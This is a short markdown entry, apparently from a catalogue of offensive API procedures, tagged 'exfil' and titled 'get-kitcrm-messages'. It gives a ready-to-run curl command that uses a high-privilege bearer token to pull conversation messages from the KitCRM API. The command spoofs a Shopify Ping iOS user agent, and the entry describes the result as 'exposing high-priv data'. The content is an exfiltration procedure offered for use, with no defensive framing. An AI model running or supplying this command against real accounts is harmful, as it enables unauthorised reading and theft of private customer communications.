---
data: >-
  curl -X GET "https://www.kitcrm.com/api/v2/messages" -H "Authorization: Bearer
  TOKEN" -H "User-Agent: Shopify Ping/2.5.4 (com.shopify.ping; build:3006; iOS
  13.1.1) Alamofire/4.8.2" -H "Accept: application/json"
tags:
  - read
  - exfil
type: command
executor: bash
platforms:
  - Web
id: 655e6f0f-3b6c-41fb-a4fd-ec11498e75f4
created_at: '2025-12-14T17:29:57.236Z'
updated_at: '2025-12-14T17:29:57.236Z'
verified: false
validated: true
submitted: true
---
# get-kitcrm-messages

## Command

```bash
curl -X GET "https://www.kitcrm.com/api/v2/messages" \
  -H "Authorization: Bearer HIGH_PRIV_TOKEN" \
  -H "User-Agent: Shopify Ping/2.5.4 (com.shopify.ping; build:3006; iOS 13.1.1) Alamofire/4.8.2" \
  -H "Accept: application/json"
```

## Description

Retrieves conversation messages using KITCRM token, exposing high-priv data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| TOKEN | Bearer token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.kitcrm.com/api/v2/messages" -H "Authorization: Bearer TOKEN"
```

### Advanced Usage

With encoding:

```bash
curl -H "Accept-Encoding: gzip" ...
```

## Expected Output

JSON array: [{"message": "content", ...}]. Lists chats.

## Related

- [[Related Procedure: Read-High-Priv-Messages]]
